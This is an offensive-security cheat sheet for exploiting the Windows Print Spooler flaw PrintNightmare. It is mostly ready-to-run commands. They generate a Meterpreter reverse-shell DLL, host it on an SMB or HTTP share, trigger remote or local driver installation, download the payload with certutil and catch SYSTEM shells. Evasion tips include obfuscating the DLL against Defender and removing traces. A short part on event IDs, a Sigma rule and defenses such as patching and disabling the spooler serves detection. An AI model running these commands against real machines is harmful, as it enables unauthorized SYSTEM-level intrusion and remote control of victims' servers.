# PrintNightmare (CVE-2021-34527)

Remote code execution in Windows Print Spooler service (`spoolsv.exe`). Allows SYSTEM-level execution on vulnerable servers via the `RpcAddPrinterDriver` RPC call.

## How It Works

```
Attacker ──► RpcAddPrinterDriver (MS-RPRN) ──► Target Print Spooler
  ──► Spooler loads attacker's DLL as printer driver
  ──► DLL executes as SYSTEM
```

## Variants

| CVE | Type | Impact |
|-----|------|--------|
| CVE-2021-34527 | RCE via RpcAddPrinterDriver | SYSTEM |
| CVE-2021-1675 | LPE via Point and Print | SYSTEM (local) |
| CVE-2021-34481 | Second LPE variant | SYSTEM (local) |

## Prerequisites

- Valid domain credentials (for remote exploit)
- Target with Print Spooler enabled (`spoolsv.exe` running)
- Unpatched Windows (patch: July 2021)
- SMB share or WebDAV accessible by target for DLL delivery

## Check if Vulnerable

### NetExec
```bash
# Check for Print Spooler
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M printnightmare

# Check with spooler module
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spooler

# Enumerate spooler service
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M enum_spooler
```

### Impacket rpcdump
```bash
# Check if MS-RPRN is accessible
rpcdump.py 'domain/user:pass@10.10.10.10' | grep -i spool
```

## Linux — CVE-2021-34527 Exploitation

### Using impacket printnightmare
```bash
# Create a malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f dll -o evil.dll

# Host DLL on SMB share
sudo impacket-smbserver share /tmp/ -smb2support

# Exploit (target installs printer driver from your SMB share)
python3 printnightmare.py 'domain/user:pass@10.10.10.10' '\\10.10.10.5\share\evil.dll'
```

### Using NetExec
```bash
# With custom DLL
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M printnightmare -o 'dllpath=\\10.10.10.5\share\evil.dll'

# With Metasploit
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M printnightmare -o 'dllpath=\\10.10.10.5\share\evil.dll'
```

## Windows — CVE-2021-1675 LPE (Local Privilege Escalation)

### PowerShell (Point and Print)
```powershell
# Add printer driver with malicious DLL
$dllpath = "C:\Users\public\evil.dll"
cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvr.vbs -a -m "evil" -h "x64" -v 3 -e $dllpath
```

### Using MS-RPRN (Cube0x0 PoC)
```powershell
# C# PoC execution
.\PrintNightmare.exe \\10.10.10.5\share\evil.dll
```

## SMB Share Setup for DLL Delivery

```bash
# Setup SMB share to host the malicious DLL
sudo impacket-smbserver share /path/to/dlls/ -smb2support

# With credentials
sudo impacket-smbserver share /path/to/dlls/ -smb2support -username user -password pass

# Alternative: Simple HTTP server
python3 -m http.server 80

# Alternative: WebDAV
wsgidav --host=0.0.0.0 --port=80 --root=/path/to/dlls/
```

## Full Attack Flow (Remote)

```
1. Verify target has Print Spooler running (MS-RPRN accessible)
   netexec smb 10.10.10.10 -u 'user' -p 'pass' -M spooler

2. Generate malicious DLL
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f dll -o evil.dll

3. Start SMB share hosting DLL
   sudo impacket-smbserver share /tmp/ -smb2support

4. Set up reverse shell listener
   msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.5; set LPORT 4444; run"

5. Trigger PrintNightmare
   netexec smb 10.10.10.10 -u 'user' -p 'pass' -M printnightmare -o 'dllpath=\\10.10.10.5\share\evil.dll'

6. Receive SYSTEM shell on listener
   [*] Sending stage (200262 bytes) to 10.10.10.10
   [*] Meterpreter session 1 opened
```

## Full Attack Flow (Local Privilege Escalation)

```
1. Access low-priv shell on target

2. Generate DLL (use staged payload for size)
   msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.5 LPORT=4445 -f dll -o evil.dll

3. Transfer DLL to target
   certutil -urlcache -f http://10.10.10.5/evil.dll C:\Users\public\evil.dll

4. Start listener
   nc -lvnp 4445

5. Execute local PrintNightmare PoC
   .\PrintNightmare.exe "C:\Users\public\evil.dll"
   -- OR --
   cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvr.vbs -a -m "evil" -h "x64" -v 3 -e "C:\Users\public\evil.dll"

6. SYSTEM shell acquired
```

## Detection & Signatures

**Windows Event Logs:**
- **Event ID 316** — Print Spooler driver added
- **Event ID 360** — Print Spooler loaded a driver
- **Event ID 4610** — Print Spooler service started
- **Event ID 7045** — A service was installed (spoolsv)
- **Event ID 4688** — Process creation (spoolsv.exe spawning)

**Print Spooler Specific:**
- **Driver installation events** — `Microsoft-Windows-PrintService/Operational`
- **Event ID 811** — Print Spooler driver deployment
- **Event ID 815** — Print Spooler driver added from network

**Network Signatures:**
- SMB file access from target to attacker's SMB share (\\attacker\share\evil.dll)
- MS-RPRN RPC calls (RpcAddPrinterDriver) from unusual source
- Driver file download from HTTP/WebDAV to target

**Sigma Rules:**
```yaml
title: PrintNightmare Driver Load
detection:
  selection:
    Provider: 'Microsoft-Windows-PrintService'
    EventID: 316
  condition: selection
```

## OPSEC Considerations

- **Very noisy** — Print Spooler driver installation is heavily logged
- **EDR detection** — Most EDRs block PrintNightmare since mid-2021
- **DLL must be accessible** — Target needs SMB or HTTP access to attacker
- **Service crash** — Failed exploit may crash Print Spooler (visible)
- **Target selection** — Old Windows versions more likely vulnerable
- **Clean up driver** — Remove added printer driver after shell
- **Windows Defender** — May block the DLL drop or execution
- **Signatures** — Known signatures block most public PoCs

## Defenses

- **Disable Print Spooler** — Where not needed (servers, DCs):
  ```powershell
  Stop-Service Spooler -Force
  Set-Service Spooler -StartupType Disabled
  ```
- **Apply July 2021 patch** — KB5004945 and later
- **GPO:** Disallow `AddPrinterDriver` via `RestrictDriverInstallationToAdministrators`
- **Block SMB outbound** — Restrict outbound SMB (port 445) from servers to unknown hosts
- **AppLocker / WDAC** — Block unsigned DLLs in `%WINDIR%\system32\spool\drivers\`

**Verify Defenses:**
```powershell
# Check Print Spooler status
Get-Service Spooler

# Check driver restrictions
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Providers\LanMan Print Services\Servers"
```

## Common Pitfalls

| Issue | Fix |
|-------|-----|
| Error: "Access Denied" | User lacks printer admin rights; use different account |
| DLL not loading | Ensure DLL is compiled for correct architecture (x64/x86) |
| SMB not accessible | Use WebDAV or HTTP instead of SMB |
| Spooler service not running | Target not vulnerable; move on |
| Windows Defender blocks DLL | Obfuscate or use signed DLL |

## Alternative Tools & PoCs

- **Cube0x0 PoC**: https://github.com/cube0x0/CVE-2021-1675
- **SysInternals Sigcheck**: Check Patch Status
  ```bash
  sigcheck.exe -i C:\Windows\System32\win32k.sys
  ```
- **CrackMapExec / NetExec** modules for PrintNightmare
- **Metasploit** `exploit/windows/smb/printnightmare`

## References

- CVE-2021-34527: Windows Print Spooler Remote Code Execution
- CVE-2021-1675: Windows Print Spooler Privilege Escalation
- Microsoft Advisory: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
- cube0x0 PoC: https://github.com/cube0x0/CVE-2021-1675
- NetExec PrintNightmare module
